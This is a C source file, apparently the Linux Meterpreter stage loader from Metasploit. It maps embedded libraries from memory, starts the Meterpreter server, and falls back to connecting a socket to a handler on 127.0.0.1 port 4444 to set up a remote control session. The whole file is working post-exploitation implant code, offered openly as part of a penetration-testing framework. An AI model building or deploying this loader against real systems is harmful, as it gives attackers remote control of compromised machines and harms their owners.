/*
 * metasploit 
 */

#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <endian.h>

#include "linker.h"
#include "linker_debug.h"
#include "linker_format.h"

#include "libc.h"
#include "libm.h"
#include "libcrypto.h"
#include "libssl.h"
#include "libsupport.h"
#include "libmetsrv_main.h"
#include "libpcap.h"

struct libs {
	char *name;
	void *buf;
	size_t size;
	void *handle;
};

static struct libs libs[] = {
	{ "libc.so", libc, libc_length, NULL },
	{ "libm.so", libm, libm_length, NULL },
	{ "libcrypto.so.0.9.8", libcrypto, libcrypto_length, NULL },
	{ "libssl.so.0.9.8", libssl, libssl_length, NULL },
	{ "libsupport.so", libsupport, libsupport_length, NULL },
	{ "libmetsrv_main.so", libmetsrv_main, libmetsrv_main_length, NULL },
	{ "libpcap.so.1", libpcap, libpcap_length, NULL },
};

#define LIBC_IDX 0
#define METSRV_IDX  5

/*
 * Once the library has been mapped in, this is where code execution needs to
 * begin payload wise. I'm not sure why we have base, I kept it because
 * that's what the API has.
 */

int dlsocket(void *libc);

unsigned metsrv_rtld(int fd)
{
	int i;
	int (*libc_init_common)();
	int (*server_setup)();
	struct stat statbuf;

	INFO("[ preparing to link. fd = %d ]\n", fd);

	for(i = 0; i < sizeof(libs) / sizeof(struct libs); i++) {
		libs[i].handle = (void *) dlopenbuf(libs[i].name, libs[i].buf, libs[i].size);
		if(! libs[i].handle) {
			TRACE("[ failed to load %s/%08x/%08x, bailing ]\n", libs[i].name, libs[i].buf, libs[i].size);
			exit(1);
		}
	}

	libc_init_common = dlsym(libs[LIBC_IDX].handle, "__libc_init_common");
	TRACE("[ __libc_init_common is at %08x, calling ]\n", libc_init_common);
	libc_init_common();

	if(fstat(fd, &statbuf) == -1) {
		TRACE("[ supplied fd fails fstat() check, using dlsocket() ]\n");
		fd = dlsocket(libs[LIBC_IDX].handle);
		if(fd == -1) {
			TRACE("[ failed to dlsocket() a connection. exit()ing ]\n");
			exit(-1);
		}
	}

	server_setup = dlsym(libs[METSRV_IDX].handle, "server_setup");
	TRACE("[ metsrv server_setup is at %08x, calling ]\n", server_setup);
	server_setup(fd);

	TRACE("[ metsrv_rtld(): server_setup() returned, exit()'ing ]\n");
	exit(1);
}

/*
 * If we have been executed directly (instead of staging shellcode / 
 * rtldtest binary, we will have an invalid fd passed in. Here we 
 * use the libc symbols to connect to the metasploit session
 */

int dlsocket(void *libc)
{
	int retcode = -1;
	int fd;
	int (*libc_socket)();
	int (*libc_connect)();
	int (*libc_inet_addr)();
	struct sockaddr_in sin;
	
	libc_socket = dlsym(libc, "socket");
	libc_connect = dlsym(libc, "connect");
	libc_inet_addr = dlsym(libc, "inet_addr");

	memset(&sin, 0, sizeof(struct sockaddr_in));

	do {
		fd = libc_socket(AF_INET, SOCK_STREAM, 0);
		if(fd == -1) break;

		sin.sin_addr.s_addr = libc_inet_addr("127.0.0.1");
		sin.sin_port = htons(4444);
		sin.sin_family = AF_INET;

		if(libc_connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) break;
		retcode = fd;

	} while(0);

	return retcode;

}

/* 
 * If we are compiled into an executable, we'll start here.  I can't be
 * bothered adding socketcall() wrappers for bind / accept / connect / crap, so
 * use bash / nc / whatever to put a socket on fd 5 for now.
 *
 */

void sigchld(int signo)
{
	waitpid(-1, NULL, WNOHANG);
}

void _start(int fd)
{
	signal(SIGCHLD, sigchld);
	signal(SIGPIPE, SIG_IGN);

	// we can't run ./msflinker directly. Use rtldtest to test the code 
	metsrv_rtld(fd);
}